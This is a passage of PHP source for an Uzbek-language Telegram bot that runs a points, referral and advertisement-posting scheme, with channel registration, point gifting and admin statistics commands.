'chat_id'=> $cid,
'text'=>"Kechirasiz faqat son yuboring!",
]);
}
}
}

if ($tx == "✅ Ha"){
$kanal = file_get_contents("reklama/kanal.txt");
$baza1 = file_get_contents("reklama/$cid.baza1");
$baza2 = file_get_contents("reklama/$cid.baza2");
$baza3 = file_get_contents("reklama/$cid.baza3");
$baza = file_get_contents("reklama/$cid.baza");
bot ('SendMessage', [
'chat_id'=> $cid,
'parse_mode'=>"markdown",
'text'=>"*So'rov bajarildi!*

 `Sizning reklamangiz` [@tg_reklar] `kanalimizga joylandi. Eslatib o'tamiz agar reklama qoidalarga to'g'ri kelmasa kanaldan olib tashlanadi.`",
'reply_markup'=>$key,
]);
bot ('SendMessage',[
'chat_id'=>$admin,
'parse_mode'=>"html",
'text'=>"📡 <b>$baza</b> 📡
⬇👥 <b>$baza3 a'zo</b> 👥⬇
<a href='$baza2'>$baza1</a>

Ⓜ<b>anba:</b> @tg_reklar
💎 <b>Reklamachi:</b> <a href='tg://user?id=$cid'>$cid</a>",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"➕ A'zo bo'lish",'url'=>$baza2]]
]
])
]);
$ex = explode("\n", $kanal);
foreach ($ex as $chan){
bot ('SendMessage',[
'chat_id'=>$chan,
'parse_mode'=>"html",
'text'=>"📡 <b>$baza</b> 📡
⬇👥 <b>$baza3 a'zo</b> 👥⬇
<a href='$baza2'>$baza1</a>

Ⓜ<b>anba:</b> @tg_reklar",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"➕ A'zo bo'lish",'url'=>$baza2]],
]
])
]);
$ball = file_get_contents("ochko/$cid.dat");
$ball -=1000;
file_put_contents("ochko/$cid.dat", $ball);
unlink("reklama/$cid.baza");
unlink("reklama/$cid.baza1");
unlink("reklama/$cid.baza2");
unlink("reklama/$cid.baza3");
}
}

if ($tx == "Yo'q"){
bot ('SendMessage',[
'chat_id'=> $cid,
'text'=>"❎*Reklama joylash bekor qilindi*",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'resize_keyboard'=>false,
'keyboard'=>[
[['text'=>"💰 Kunlik bonus"]],
[['text'=>"📨 Reklama joylash"],['text'=>"💎 Kanal qo'shish"]],
[['text'=>"👤 Mening hisobim"],['text'=>"🎁 Ball sovg'a qilish"]],
[['text'=>"📡 Kanalga qo'shilib ball ishlash"],['text'=>"⁉️ Qanday reklama joylash mumkin"]],
]
])
]);
unlink("reklama/$cid.baza");
unlink("reklama/$cid.baza1");
unlink("reklama/$cid.baza2");
unlink("reklama/$cid.baza3");
}

if($tx == "👤 Mening hisobim"){
bot ('SendMessage', [
'chat_id'=> $cid,
'parse_mode'=>"markdown",
'text'=>"*Ballarni sotish* (`paynet, reklama qivorish, hisobdan hisobga o'tkazish evaziga`) *yoki sotvolish* (`reklama qiberganlik uchun ball olish, paynet, click, nomerdan nomerga pul o'tqizib berish`) *mumkin emas*

_Bundan tashqari, agar kanal yoki guruh qo'shish qoidalariga amal qilmoqchi bo'lmasangiz, ball yig'may qo'ya qolishni maslahat beramiz_",
]);
$ball = file_get_contents("ochko/$cid.dat");
$ref = file_get_contents("ochko/$cid.ref");
if ($ball == null){
$ball = "0";
}
if ($ref == null){
$ref = "0";
}
bot ('SendMessage', [
'chat_id'=> $cid,
'parse_mode'=>"markdown",
'text'=>"🕵*Do'stlaringizni taklif qilish uchun ssilka:*➡️ https://telegram.me/$bot?start=$cid

_👤Har bitta taklif qilingan va bu botdan oldin foydalanmagan odamga 200 ball olasiz!
🔘1000 ballga 1ta gruppa yoki kanal reklama qilishingiz mumkin_

💰*To'plagan ballingiz:* $ball*ball*
👥*Referallaringiz soni:* $ref*ta*",
'reply_to_message_id'=>$mid,
'reply_markup'=>json_encode([ 
'inline_keyboard' => [ 
[['text'=>"🖇 Yangilash",'callback_data'=>"update"]],
[['text'=>"♻ Do'stlarga ulashish",'switch_inline_query'=>"-"]]
]
])
]);
}

if($tx == "/account"){
if ($ball == null){
$ball = "0";
}
if ($ref == null){
$ref = "0";
}
$ball = file_get_contents("ochko/$cid.dat");
bot ('SendMessage', [
'chat_id'=> $cid,
'parse_mode'=>"markdown",
'text'=>"🕵*Do'stlaringizni taklif qilish uchun ssilka:*➡️ https://telegram.me/$bot?start=$cid

_👤Har bitta taklif qilingan va bu botdan oldin foydalanmagan odamga 200 ball olasiz!
🔘1000 ballga 1ta gruppa yoki kanal reklama qilishingiz mumkin_

💰*To'plagan ballingiz:* $ball*ball*
👥*Referallaringiz soni:* $ref*ta*",
'reply_to_message_id'=>$mid,
'reply_markup'=>json_encode([ 
'inline_keyboard' => [ 
[['text'=>"♻ Do'stlarga ulashish",'switch_inline_query'=>"-"],],
]
])
]);
}

if ($tx == "⏺ Bekor qilish"){
bot ('SendMessage',[
'chat_id'=> $cid,
'text'=>"♻OK",
'reply_markup'=>json_encode([
'resize_keyboard'=>false,
'keyboard'=>[
[['text'=>"💰 Kunlik bonus"]],
[['text'=>"📨 Reklama joylash"],['text'=>"💎 Kanal qo'shish"]],
[['text'=>"👤 Mening hisobim"],['text'=>"🎁 Ball sovg'a qilish"]],
[['text'=>"📡 Kanalga qo'shilib ball ishlash"],['text'=>"⁉️ Qanday reklama joylash mumkin"]],
]
])
]);
unlink("reklama/$cid.st");
unlink("reklama/$cid.step");
unlink("reklama/$cid.sovga");
unlink("reklama/$cid.contact");
}

$st = file_get_contents("reklama/$cid.st");
if($tx == "💎 Kanal qo'shish"){
$baza = file_get_contents("reklama/kanal.txt");
$obsh = substr_count($baza,"\n"); 
bot ('SendMessage', [
'chat_id'=> $cid,
'parse_mode'=>"markdown",
'text'=>"*Siz bot* [@tg_reklar] *kanaliga yuborayotgan reklamalarni o'z kanalingizga ham yuborilishini isaysizmi?*

`Demak bu funksiya aynan siz uchun. Bu xuddi autopostingga o'xshaydi. Bot sizning kanalingizga` [@tg_reklar] `kanaliga jo'natayotgan reklamalarni sizning kanalingizga ham jo'natadi. Manba sifatida sizning kanalingiz ko'rsatiladi.`
*Buning uchun shu yerga kanalingiz userini yuboring va kanalingiz botga qo'shiladi*
`Hozircha botimizga` *$obsh ta* `kanal qo'shilgan`",
'reply_to_message_id'=> $mid,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🗑 Kanalni botdan o'chirish"]],
[['text'=>"⏺ Bekor qilish"]],
]
])
]);
file_put_contents("reklama/$cid.st","us");
}

if ($st == "us" and $tx != "🗑 Kanalni botdan o'chirish"){
if ($tx == "/start" or $tx == "⏺ Bekor qilish"){
}else{
$baza = file_get_contents("reklama/kanal.txt");
$adm = bot('getChatAdministrators', [
'chat_id'=>$tx,
]);
$adok = $adm->ok;
if($adok){
if(mb_stripos($baza,$tx)!==false){
bot ('SendMessage', [
'chat_id'=> $cid,
'parse_mode'=>"markdown",
'text'=>"💫 [$tx] *kanali avvalroq botga qo'shilgan!*",
]);
}else{
file_put_contents("reklama/kanal.txt", "$baza\n$tx");
bot('sendmessage',[
'chat_id'=>$cid,
'parse_mode'=>"markdown",
'text'=>"✅ [$tx] *kanali botga qo'shildi endi reklamalar sizning kanalingizga yuboriladi*"
]);
unlink("reklama/$cid.st");
}
}else{
bot('sendmessage',[
'chat_id'=>$cid,
'parse_mode'=>"markdown",
'text'=>"🔒 *Bot kanalda admin emas* @reklarbot *botni kanalga admin qilib qayta urunib ko'ring!*",
]);
}
}
}

if ($tx == "🗑 Kanalni botdan o'chirish"){
if ($kanal == null){
bot ('SendMessage',[
'chat_id'=> $cid,
'text'=>"Hozircha botda kanallar mavjud emas!",
'reply_markup'=>json_encode([
'resize_keyboard'=>false,
'keyboard'=>[
[['text'=>"💰 Kunlik bonus"]],
[['text'=>"📨 Reklama joylash"],['text'=>"💎 Kanal qo'shish"]],
[['text'=>"👤 Mening hisobim"],['text'=>"🎁 Ball sovg'a qilish"]],
[['text'=>"📡 Kanalga qo'shilib ball ishlash"],['text'=>"⁉️ Qanday reklama joylash mumkin"]],
]
])
]);
}else{
bot ('SendMessage', [
'chat_id'=> $cid,
'text'=>"O'chirmoqchi bo'lgan kanal userini yuboring:",
'reply_markup'=>json_encode([
'resize_keyboard'=>false,
'keyboard'=> [
[['text'=>"⏺ Bekor qilish"]],
]
])
]);
file_put_contents("reklama/$cid.st","kanal");
}
}

if ($st == "kanal"){
if ($tx == "/start" or $tx == "⏺ Bekor qilish"){
}else{
if ($kanal == null){
if (mb_stripos($kanal,$tx)!==false){
$str = str_replace($tx,"", $kanal);
bot ('SendMessage', [
'chat_id'=> $cid,
'parse_mode'=>"markdown",
'text'=>"🗑 *Yaxshi* [$tx] *kanal ro'yxatdan olib tashlandi endi reklamalar sizning kanalingizga yuborilmaydi.*",
'reply_markup'=>json_encode([
'resize_keyboard'=>false,
'keyboard'=>[
[['text'=>"💰 Kunlik bonus"]],
[['text'=>"📨 Reklama joylash"],['text'=>"💎 Kanal qo'shish"]],
[['text'=>"👤 Mening hisobim"],['text'=>"🎁 Ball sovg'a qilish"]],
[['text'=>"📡 Kanalga qo'shilib ball ishlash"],['text'=>"⁉️ Qanday reklama joylash mumkin"]],
]
])
]);
file_put_contents("reklama/kanal.txt", $str);
unlink("reklama/$cid.st");
}else{
bot ('SendMessage', [
'chat_id'=> $cid,
'text'=>"Bunday kanal botda mavjud emas!",
]);
}
}else{
bot ('SendMessage',[
'chat_id'=> $cid,
'text'=>"Hozircha botda kanallar mavjud emas!",
'reply_markup'=>json_encode([
'resize_keyboard'=>false,
'keyboard'=>[
[['text'=>"💰 Kunlik bonus"]],
[['text'=>"📨 Reklama joylash"],['text'=>"💎 Kanal qo'shish"]],
[['text'=>"👤 Mening hisobim"],['text'=>"🎁 Ball sovg'a qilish"]],
[['text'=>"📡 Kanalga qo'shilib ball ishlash"],['text'=>"⁉️ Qanday reklama joylash mumkin"]],
]
])
]);
unlink("reklama/$cid.st");
}
}
}

if((mb_stripos($tx,"/ochko")!==false) and $uid == $admin){
$ex = explode("_", $tx);
$refid = $ex[1];
$ball = $ex[2];
$user = file_get_contents("ochko/$refid.dat");
$us = $user + $ball;
file_put_contents("ochko/$refid.dat",$us);
bot ('SendMessage', [
'chat_id'=> $admin,
'text'=>"✅ $ball ball berildi",
]);
}

if ($tx == "/stat" and $uid == $admin){
$kanal = file_get_contents("reklama/kanal.txt");
$user = file_get_contents("reklama/user.db");
$group = file_get_contents("reklama/group.db");
$rek = file_get_contents("reklama/reklama.db");
$ka = substr_count($kanal,"\n");
$us = substr_count($user,"\n");
$gr = substr_count($group,"\n");
bot ('SendMessage', [
'chat_id'=> $cid,
'text'=>"📈*Botimiz statistikasi*
👤A'zolar: *$us*
📡Kanallar: *$ka*
👥Guruhlar: *$gr*
💎Qilingan reklamalar: *$rek*",
'parse_mode'=>"markdown",
]);
}

$st = file_get_contents("reklama/$cid.st");
$ball = file_get_contents("ochko/$cid.dat");
if ($tx == "🎁 Ball sovg'a qilish"){
if ($ball > 999){
bot ('SendMessage', [
'chat_id'=> $cid,
'parse_mode'=>"markdown",
'text'=>"🔸Siz do'stingizga ochko sovg'a qilmoqchimisiz? Unda menga do'stingizni *kontaktini jo'nating!*\nBuning uchun uni *profiliga kiring* va \"`share contact`\"ni *bosing* keyin esa *botni tanlang.*",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"⏺ Bekor qilish"]],
]
])
]);
file_put_contents("reklama/$cid.st","ball");
}else{
bot ('SendMessage', [
'chat_id'=> $cid,
'text'=>"Sizda ball yetarli emas!
Ochkoni sovg'a qilish uchun kamida hisobingizda 1000ball bo'lishi kerak!",
]);
}
}

if($st == "ball"){
if ($tx == "/start" or $tx == "⏺ Bekor qilish"){
}else{
$baza = file_get_contents("reklama/user.db");
if (mb_stripos($baza,$conid)!==false){
if (isset ($contact)){
file_put_contents("reklama/$cid.contact",$conid);
bot ('SendMessage', [
'chat_id'=> $cid,
'text'=>"Endi nechi ball sovg'a qilishingizni yuboring:",
]);
file_put_contents("reklama/$cid.st","hi");
}else{
bot ('SendMessage',[
'chat_id'=> $cid,
'parse_mode'=>"markdown",
'text'=>"Faqat *kontakt* yuboring",
]);
}
}else{
bot ('SendMessage', [
'chat_id'=> $cid,
'text'=>"Kechirasiz ushbu foydalanuvchi bot a'zosi emas!",
]);
}
}
}

if ($st == "hi"){
if ($tx == "/start" or $tx == "⏺ Bekor qilish"){
}else{ 
if($tx <= 10000 and $tx >= 1000){
file_put_contents("reklama/$cid.sovga",$tx);
file_put_contents("reklama/$cid.id", $cid);
$con = file_get_contents("reklama/$cid.contact");
$sov = file_get_contents("reklama/$cid.sovga");
bot ('SendMessage', [
'chat_id'=> $cid,
'parse_mode'=>"markdown",
'text'=>"*So'rov qabul qilindi!*

`Agar` [$con](tg://user?id=$con) `foydalanuvchi ballni qabul qilsa sizga xabar beramiz!`",
'reply_markup'=>json_encode([
'resize_keyboard'=>false,
'keyboard'=>[
[['text'=>"💰 Kunlik bonus"]],
[['text'=>"📨 Reklama joylash"],['text'=>"💎 Kanal qo'shish"]],
[['text'=>"👤 Mening hisobim"],['text'=>"🎁 Ball sovg'a qilish"]],
[['text'=>"📡 Kanalga qo'shilib ball ishlash"],['text'=>"⁉️ Qanday reklama joylash mumkin"]],
]
])
]);
bot ('SendMessage', [
'chat_id'=> $con,
'parse_mode'=>"markdown",
'text'=>"🔘 `Sizga` [$cid](tg://user?id=$cid) `tomonidan` *$sov ball* `sovg'a qilindi. Ballni pastdagi tugmalar yordamida qabul qilishingiz mumkin!`",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"✅ Qabul qilish",'callback_data'=>"ok_$cid"],['text'=>"❎ Rad etish",'callback_data'=>"no_$cid"]]
]
])
]);
unlink("reklama/$cid.st");
}
}
}
}

if (mb_stripos($data,"ok")!==false){
$ex = explode("_", $data);
$sov = file_get_contents("reklama/$ex[1].sovga");
$con = file_get_contents("reklama/$ex[1].contact");
$refid = file_get_contents("ochko/$con.dat");
$ball = file_get_contents("ochko/$ex[1].dat");
$hi = $refid + $sov;
$hu = $ball - $sov;
file_put_contents("ochko/$con.dat",$hi);
file_put_contents("ochko/$ex[1].dat","$hu");
$id = $ex[1];
bot ('EditMessageText', [
'chat_id'=> $cid2,
'message_id'=> $mid2,
'text'=>"✅ `Yaxshi sizning hisobingizga` [$id](tg://user?id=$id) `tomonidan` *$sov ball* `qo'shildi!`",
'parse_mode'=>"markdown",
]);
bot ('SendMessage',[
'chat_id'=> $ex[1],
'parse_mode'=>"markdown",
'text'=>"✅ `Yaxshi` [$con](tg://user?id=$con) `hisobiga` *$sov ball* `qo'shildi!`",
]);
unlink("reklama/$ex[1].sovga");
unlink("reklama/$ex[1].contact");
}

if (mb_stripos($data,"no")!==false){
$ex = explode("_", $data);
$sov = file_get_contents("reklama/$ex[1].sovga");
$con = file_get_contents("reklama/$ex[1].contact");
$id = $ex[1];
bot ('EditMessageText', [
'chat_id'=> $cid2,
'message_id'=> $mid2,
'text'=>"✅ `Yaxshi siz` [$id](tg://user?id=$id) `tomonidan berilgan` *$sov ball*`ni rad etdingiz!`",
'parse_mode'=>"markdown",
]);
bot ('SendMessage',[
'chat_id'=> $ex[1],
'parse_mode'=>"markdown",
'text'=>"❎ [$con](tg://user?id=$con) `foydalanuvchiga yuborilgan` *$sov ball* `rad etildi!`",
]);
unlink("reklama/$ex[1].sovga");
unlink("reklama/$ex[1].contact");
}

if($tx == "/code" and $cid == $admin){
bot('sendDocument',[
'chat_id'=>$cid,
'document'=>new CURLFile(__FILE__),
'caption'=>"@reklarbot *code*",
'parse_mode'=>"markdown",
'reply_to_message_id'=>$mid,
]);
}

$userID = $update->inline_query->from->id;
$cid = $update->inline_query->query;
if ($update->inline_query){
if(mb_stripos($cid,"-")!==false){
bot('answerInlineQuery', [
'inline_query_id'=>$update->inline_query->id,
'cache_time'=>1,
'results'=>json_encode([[
'type'=>'article',
'id'=>base64_encode(1),
'title'=>"Ustiga bosing!",
'input_message_content'=>[
'parse_mode' => 'markdown',
'message_text'=>"🕵*Do'stlaringizni taklif qilish uchun ssilka:*➡️ https://telegram.me/$bot?start=$userID

👤*Har bitta taklif qilingan va bu botdan oldin foydalanmagan odamga 200ball olasiz!*
🔘_1000 ballga 1ta gruppa yoki kanalingizni_ [@tg_reklar] _kanalida reklama qilishingiz mumkin_",],
'reply_markup' =>[ 
'inline_keyboard'=>[
[["switch_inline_query"=>"-", 'text' => "♻ Do'stlarga ulashish"],],
]],        
]
])
]);
}
}else{
 bot('answerInlineQuery', [
'inline_query_id'=>$update->inline_query->id,
'switch_pm_text'=>"Botga kirish",
]); 
}

?>